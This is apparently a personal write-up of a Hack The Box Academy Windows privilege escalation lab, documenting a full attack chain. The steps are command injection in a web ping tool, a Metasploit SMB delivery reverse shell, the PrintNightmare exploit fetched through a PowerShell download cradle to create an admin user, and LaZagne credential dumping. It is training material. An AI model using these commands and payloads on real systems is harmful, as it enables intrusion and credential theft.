# Windows Privilege Escalation — Skills Assessment Part I

**Platform:** Hack The Box Academy  
**Module:** Windows Privilege Escalation  
**Assessment:** Skills Assessment — Part I  
**Difficulty:** Medium  
**OS:** Windows Server 2016 (Build 10.0.14393)  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|---------|
| 1 | Nmap scan | Discovered HTTP (80) + RDP (3389) |
| 2 | Command injection on web app | RCE as IIS service account |
| 3 | SMB delivery via Metasploit | Meterpreter session established |
| 4 | PrintNightmare (CVE-2021-1675) | New local admin user created |
| 5 | RDP as new admin + LaZagne | Recovered `ldapadmin` credentials |
| 6 | Read Administrator Desktop | Captured `flag.txt` |
| 7 | Navigate post-escalation | Captured `confidential.txt` |

---

## Question 1 — Enumerate Installed KBs

**Question:** Which two KBs are installed on the target system?

### Step 1 — Nmap Reconnaissance

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -sC -sV -Pn 10.129.225.46

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 16:52 GMT
Nmap scan report for 10.129.225.46
Host is up (0.077s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: DEV Connection Tester
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WINLPE-SKILLS1-
|   DNS_Computer_Name: WINLPE-SKILLS1-SRV
|   Product_Version: 10.0.14393
|_  System_Time: 2022-10-31T16:52:30+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Two attack surfaces identified — IIS web application on port 80 and RDP on port 3389.

---

### Step 2 — Command Injection via Web App

The "DEV Connection Tester" web application accepts input for pinging hosts. Testing reveals it is vulnerable to command injection:

```
127.0.0.1 && whoami
```

The response confirms code execution as the IIS service account.

---

### Step 3 — SMB Delivery → Meterpreter Session

```bash
Hackerpatel007_1@htb[/htb]$ sudo msfconsole -q

msf6> use exploit/windows/smb/smb_delivery
msf6 exploit(windows/smb/smb_delivery)> set SRVHOST tun0
msf6 exploit(windows/smb/smb_delivery)> set LHOST tun0
msf6 exploit(windows/smb/smb_delivery)> exploit

[*] Started reverse TCP handler on 10.10.14.72:4444
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.14.72\xYBi\test.dll,0
```

Inject the generated command via the command injection vulnerability:

```
127.0.0.1 && rundll32.exe \\10.10.14.72\xYBi\test.dll,0
```

```bash
msf exploit(windows/smb/smb_delivery)> [*] Sending stage (175686 bytes) to 10.129.225.46
[*] Meterpreter session 1 opened (10.10.14.72:4444 -> 10.129.225.46:49671)
```

Attach to the session and drop into a CMD shell:

```bash
msf exploit(windows/smb/smb_delivery)> sessions -i 1

(Meterpreter 1)(c:\windows\system32\inetsrv) > shell

Process 3008 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]

c:\windows\system32\inetsrv>
```

---

### Step 4 — Enumerate Installed KBs

```cmd
c:\windows\system32\inetsrv> wmic qfe

Caption                                     HotFixID   InstalledBy          InstalledOn
http://support.microsoft.com/?kbid=3199986  KB3199986  NT AUTHORITY\SYSTEM  11/21/2016
http://support.microsoft.com/?kbid=3200970  KB3200970  NT AUTHORITY\SYSTEM  11/21/2016
```

> **Answer:** `HTB{flag_redacted}`

---

## Question 2 — Find the Password for the `ldapadmin` Account

**Question:** Find the password for the `ldapadmin` account somewhere on the system.

### Step 1 — Clone PrintNightmare PoC (CVE-2021-1675)

```bash
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/calebstewart/CVE-2021-1675.git

Cloning into 'CVE-2021-1675'...
remote: Total 40 (delta 1), reused 1 (delta 1), pack-reused 37
Receiving objects: 100% (40/40), 127.17 KiB | 2.49 MiB/s, done.
```

### Step 2 — Append Payload to the Script

```bash
Hackerpatel007_1@htb[/htb]$ echo 'Invoke-Nightmare -NewUser "Hacker" -NewPassword "Pwnd1234!" -DriverName "Printyboi"' >> CVE-2021-1675.ps1
```

### Step 3 — Serve the Script

```bash
Hackerpatel007_1@htb[/htb]$ cd CVE-2021-1675/
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 ...
```

### Step 4 — Trigger via Command Injection

Use the web app command injection to invoke the script via PowerShell IEX:

```
127.0.0.1 | powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.114:8080/CVE-2021-1675.ps1')
```

A new local administrator user `Hacker:Pwnd1234!` is created via the Print Spooler service running as SYSTEM.

---

### Step 5 — RDP as New Admin

```bash
Hackerpatel007_1@htb[/htb]$ xfreerdp /v:10.129.23.27 /u:Hacker /p:'Pwnd1234!' /dynamic-resolution
```

### Step 6 — Transfer and Run LaZagne

Download `lazagne.exe` to the attack host and serve it:

```bash
Hackerpatel007_1@htb[/htb]$ wget -q https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8080
```

On the target (elevated PowerShell):

```powershell
PS C:\Users\Public\Downloads> wget "http://10.10.14.114:8080/lazagne.exe" -o "lazagne.exe"
PS C:\Users\Public\Downloads> .\lazagne.exe all
```

```
###### User: Administrator ######

------------------- Apachedirectorystudio passwords -----------------

[+] Password found !!!
AuthenticationMethod: SIMPLE
Login: ldapadmin
Password: HTB{flag_redacted}
Host: dc01.inlanefreight.local
Port: 389
```

LaZagne recovers credentials stored in Apache Directory Studio for the `ldapadmin` account connecting to the domain's LDAP service.

> **Answer:** `HTB{flag_redacted}`

---

## Question 3 — Escalate Privileges and Read flag.txt

**Question:** Escalate privileges and submit the contents of flag.txt on the Administrator Desktop.

Using the RDP session established as the `Hacker` local admin user (elevated via PrintNightmare), open an elevated PowerShell console and read the flag directly:

```powershell
PS C:\Windows\system32> cd C:\Users\Administrator\Desktop\
PS C:\Users\Administrator\Desktop> type flag.txt

HTB{flag_redacted}
```

> **Answer:** `HTB{flag_redacted}`

---

## Question 4 — Locate and Read confidential.txt

**Question:** After escalating privileges, locate a file named confidential.txt and submit its contents.

Using the elevated session, navigate to `C:\Users\Administrator\Music\` and read the file:

```powershell
PS C:\Users\Administrator\Music> type confidential.txt

HTB{flag_redacted}
```

> **Answer:** `HTB{flag_redacted}`

---

## Flags

| Question | Answer |
|----------|--------|
| Q1 — Installed KBs | `HTB{flag_redacted}` |
| Q2 — ldapadmin password | `HTB{flag_redacted}` |
| Q3 — flag.txt (Administrator Desktop) | `HTB{flag_redacted}` |
| Q4 — confidential.txt | `HTB{flag_redacted}` |

---

## Lessons Learned

- **Command injection on internal web apps** is a reliable foothold vector — always test `ping` / connection tester inputs with `&&`, `|`, and `;` operators.
- **SMB delivery via Metasploit** (`smb_delivery` + `rundll32.exe`) is an effective method for delivering a Meterpreter payload when direct uploads are not possible.
- **PrintNightmare (CVE-2021-1675)** exploits the Windows Print Spooler service to load an attacker-controlled DLL as SYSTEM, enabling arbitrary local admin account creation with a single PowerShell invocation.
- **LaZagne** recovers credentials from a wide range of applications — including directory services clients like Apache Directory Studio — that store credentials insecurely on disk.
- **Unattend.xml** left in `C:\Windows\Panther\` after OS deployment frequently contains cleartext or base64-encoded credentials and should always be checked.

---

## Attack Chain Reference

```
Nmap scan (ports 80, 3389)
        ↓
Command injection on DEV Connection Tester web app (RCE as IIS user)
        ↓
SMB delivery → rundll32.exe → Meterpreter session
        ↓
PrintNightmare CVE-2021-1675 → new local admin user (Hacker:Pwnd1234!)
        ↓
RDP as Hacker → elevated PowerShell
        ↓
LaZagne → ldapadmin credentials recovered from Apache Directory Studio
        ↓
flag.txt + confidential.txt read from Administrator Desktop/Music
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sudo nmap -sC -sV -Pn <IP>` | Full version + script scan |
| `127.0.0.1 && whoami` | Basic command injection test |
| `use exploit/windows/smb/smb_delivery` | Metasploit SMB-based payload delivery |
| `rundll32.exe \\<IP>\<share>\test.dll,0` | Execute SMB-delivered DLL |
| `sessions -i 1` | Attach to Meterpreter session |
| `wmic qfe` | List installed hotfixes/KBs |
| `git clone https://github.com/calebstewart/CVE-2021-1675.git` | Clone PrintNightmare PoC |
| `IEX(New-Object Net.Webclient).downloadString('<url>')` | In-memory PowerShell script execution |
| `xfreerdp /v:<IP> /u:<user> /p:<pass> /dynamic-resolution` | RDP connection |
| `.\lazagne.exe all` | Recover all stored credentials |
| `type C:\Users\Administrator\Desktop\flag.txt` | Read flag |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1190 | — | Exploit Public-Facing Application (command injection on web app) |
| T1059 | T1059.003 | Command and Scripting Interpreter: Windows Command Shell |
| T1059 | T1059.001 | Command and Scripting Interpreter: PowerShell (IEX download cradle) |
| T1105 | — | Ingress Tool Transfer (LaZagne, PrintNightmare PoC via HTTP) |
| T1068 | — | Exploitation for Privilege Escalation (CVE-2021-1675 PrintNightmare) |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files (unattend.xml) |
| T1555 | T1555.003 | Credentials from Password Stores: Credentials from Applications (LaZagne → Apache Directory Studio) |
| T1021 | T1021.001 | Remote Services: Remote Desktop Protocol |

---

*Part of the HTB Academy CPTS path — Windows Privilege Escalation module.*  
*Penetration Tester role in India | Target: January 2027*
